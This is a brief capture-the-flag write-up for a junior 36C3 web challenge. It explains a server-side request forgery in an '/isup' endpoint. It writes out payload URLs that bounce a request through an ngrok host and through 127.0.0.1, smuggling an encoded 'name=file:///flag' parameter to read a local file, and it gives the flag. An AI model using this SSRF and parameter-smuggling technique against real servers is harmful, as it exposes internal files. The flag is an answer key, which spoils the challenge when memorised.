# Stage 2 - double - web - easy

## Challenge
Get the /flag at http://108.61.211.185/

## Solution
The webpage returns server (code)[https://github.com/ljagiello/junior-36c3-ctf/blob/master/2-double-web-easy/server.py].
Based on the code we see 2 routes:
* `/` - prints server code
* `/isup` - checks some conditions and makes http request

conditions:
* in param `name` we need 2 words `http` and `kuchenblech`
* `REMOTE_ADDR` cannot starts with `127` or `172`.

We can simply construct proxy and receive request on http://a903d08b.ngrok.io
```
http://108.61.211.185/isup?name=http://a903d08b.ngrok.io?kuchenblech
```
To get a flag we need to make a double request
```
http://108.61.211.185/isup?name=http://127.0.0.1:8080/isup?kuchenblech=a%26name=file:///flag
```

## Links
* https://ngrok.com/

## Flag
```
junior-double_or_noth1ng
```
